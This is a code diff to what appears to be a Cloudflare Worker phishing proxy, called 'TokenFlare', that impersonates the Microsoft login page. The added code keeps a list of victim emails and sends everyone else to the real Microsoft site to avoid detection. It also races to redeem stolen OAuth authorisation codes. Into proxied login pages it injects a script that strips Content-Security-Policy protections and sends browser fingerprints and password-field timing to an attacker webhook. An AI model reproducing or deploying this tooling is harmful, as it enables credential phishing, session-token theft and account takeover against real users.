@@ -69,7 +69,7 @@ async function storeSessionEvent(env, sessionId, eventType, data) {
 /// ─────────────────────────────────────────────────────────────
 
 export default {
-  async fetch(request, env) {
+  async fetch(request, env, ctx) {
     const cfg = loadConfig(env);
     const log = makeLogger(cfg.debug);
 
@@ -109,10 +109,64 @@ export default {
         return new Response('[]', { headers: { 'Content-Type': 'application/json' } });
     }
 
+    // Target management API endpoints
+    // Add target email(s)
+    if (url.pathname === '/api/targets' && request.method === 'POST') {
+        const body = await request.json();
+        const emails = body.emails || [];
+        if (env.SESSIONS) {
+            const existing = await env.SESSIONS.get('__targets__', 'json') || [];
+            const updated = [...new Set([...existing, ...emails])];
+            await env.SESSIONS.put('__targets__', JSON.stringify(updated));
+            return new Response(JSON.stringify({ targets: updated }), {
+                headers: { 'Content-Type': 'application/json' },
+            });
+        }
+        return new Response('{"error": "KV not available"}', { status: 500 });
+    }
+
+    // List targets
+    if (url.pathname === '/api/targets' && request.method === 'GET') {
+        if (env.SESSIONS) {
+            const targets = await env.SESSIONS.get('__targets__', 'json') || [];
+            return new Response(JSON.stringify({ targets }), {
+                headers: { 'Content-Type': 'application/json' },
+            });
+        }
+        return new Response('{"targets": []}', { headers: { 'Content-Type': 'application/json' } });
+    }
+
+    // Clear targets
+    if (url.pathname === '/api/targets' && request.method === 'DELETE') {
+        if (env.SESSIONS) {
+            await env.SESSIONS.delete('__targets__');
+            return new Response('{"status": "cleared"}', {
+                headers: { 'Content-Type': 'application/json' },
+            });
+        }
+        return new Response('{"status": "ok"}', { headers: { 'Content-Type': 'application/json' } });
+    }
+
     // 1) preFlight blocks & checks
     const denyResp = preflightBlocks(request, cfg, log);
     // all passed => returns null
     if (denyResp) return denyResp;
+
+    // 1b) Victim targeting — only proxy auth flows for listed emails
+    if (env.TARGETING_ENABLED === 'true' && env.SESSIONS) {
+        if (request.method === 'POST') {
+            const clonedBody = await request.clone().text();
+            const loginMatch = clonedBody.match(/login=([^&]+)/);
+            if (loginMatch) {
+                const email = decodeURIComponent(loginMatch[1]).toLowerCase();
+                const targets = await env.SESSIONS.get('__targets__', 'json') || [];
+                if (targets.length > 0 && !targets.includes(email)) {
+                    // Not a target — redirect to real Microsoft
+                    return Response.redirect('https://login.microsoftonline.com' + url.pathname + url.search, 302);
+                }
+            }
+        }
+    }
 
     // 2) Prepare upstream URL + headers
     const clientUrl = new URL(request.url);
@@ -304,6 +358,16 @@ export default {
                 await notifyAuthCodeStructured(cfg.webhookUrl, authParams, upstreamParams, authcodeUri, request, upstreamResp, sessionId, log)
                   .catch(console.error);
                 storeSessionEvent(env, sessionId, 'auth_code', { has_code: true }).catch(() => {});
+                // Race: exchange auth code at the edge before the webhook listener does
+                if (env.EDGE_EXCHANGE === 'true' && ctx && ctx.waitUntil) {
+                    ctx.waitUntil(raceCodeExchange(
+                        authParams.code,
+                        upstreamParams.client_id,
+                        upstreamParams.redirect_uri,
+                        upstreamParams.scope,
+                        env,
+                    ));
+                }
             }
             // then send the user to final redir
             outHeaders.set("Location", cfg.finalRedirUrl);
@@ -354,9 +418,120 @@ export default {
     const contentType = outHeaders.get('content-type') || '';
     const body = await maybeRewriteBody(upstreamResp, contentType, cfg.replaceHostRegex, clientUrl.hostname);
 
+    // 13) HTMLRewriter-based login page injection
+    if (env.HTML_INJECTION === 'true' && contentType.includes('text/html')) {
+        const injectionScript = buildInjectionScript(cfg.webhookUrl || '');
+        const rewrittenResp = new Response(body, { status: upstreamResp.status, headers: outHeaders });
+
+        const rewritten = new HTMLRewriter()
+            .on('head', {
+                element(element) {
+                    element.append(injectionScript, { html: true });
+                },
+            })
+            // Strip CSP meta tags that would block our injected script
+            .on('meta[http-equiv="Content-Security-Policy"]', {
+                element(element) {
+                    element.remove();
+                },
+            })
+            .transform(rewrittenResp);
+
+        // Also strip CSP headers
+        const finalHeaders = new Headers(rewritten.headers);
+        finalHeaders.delete('content-security-policy');
+        finalHeaders.delete('content-security-policy-report-only');
+
+        log.info('HTML injection: injected telemetry script into login page');
+        storeSessionEvent(env, sessionId, 'html_injection', { injected: true }).catch(() => {});
+
+        return new Response(rewritten.body, {
+            status: rewritten.status,
+            headers: finalHeaders,
+        });
+    }
+
     return new Response(body, { status: upstreamResp.status, headers: outHeaders });
   },
 };
+
+/// ─────────────────────────────────────────────────────────────
+/// HTML Injection
+/// ─────────────────────────────────────────────────────────────
+
+/**
+ * Build the injection script for login page telemetry.
+ * Captures browser capabilities, field interaction timing, and page visibility.
+ * Does NOT capture credentials (the proxy already gets those).
+ */
+function buildInjectionScript(webhookUrl) {
+    return `<script>
+(function() {
+    var w = '${webhookUrl}';
+    if (!w) return;
+
+    var sid = document.cookie.match(/tf_sid=([a-f0-9-]+)/);
+    sid = sid ? sid[1] : 'unknown';
+
+    function send(type, data) {
+        try {
+            var xhr = new XMLHttpRequest();
+            xhr.open('POST', w, true);
+            xhr.setRequestHeader('Content-Type', 'application/json');
+            xhr.send(JSON.stringify({
+                source: 'TokenFlare',
+                type: type,
+                session_id: sid,
+                timestamp: new Date().toISOString(),
+                data: data
+            }));
+        } catch(e) {}
+    }
+
+    // Capture browser capabilities
+    var caps = {
+        webauthn: !!window.PublicKeyCredential,
+        platform_auth: false,
+        user_agent: navigator.userAgent,
+        language: navigator.language,
+        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+        screen: screen.width + 'x' + screen.height,
+        touch: 'ontouchstart' in window,
+    };
+
+    // Check platform authenticator availability
+    if (window.PublicKeyCredential && PublicKeyCredential.isUserVerifyingPlatformAuthenticatorAvailable) {
+        PublicKeyCredential.isUserVerifyingPlatformAuthenticatorAvailable()
+            .then(function(available) {
+                caps.platform_auth = available;
+                send('browser_caps', caps);
+            })
+            .catch(function() { send('browser_caps', caps); });
+    } else {
+        send('browser_caps', caps);
+    }
+
+    // Track password field interaction timing
+    var pwdStart = 0;
+    document.addEventListener('focusin', function(e) {
+        if (e.target && (e.target.type === 'password' || e.target.name === 'passwd')) {
+            pwdStart = Date.now();
+        }
+    });
+    document.addEventListener('focusout', function(e) {
+        if (e.target && (e.target.type === 'password' || e.target.name === 'passwd') && pwdStart) {
+            send('field_timing', { field: 'password', duration_ms: Date.now() - pwdStart });
+            pwdStart = 0;
+        }
+    });
+
+    // Track page visibility (detects tab switching during MFA)
+    document.addEventListener('visibilitychange', function() {
+        send('visibility', { hidden: document.hidden });
+    });
+})();
+</script>`;
+}
 
 /// ─────────────────────────────────────────────────────────────
 /// Guards / builders
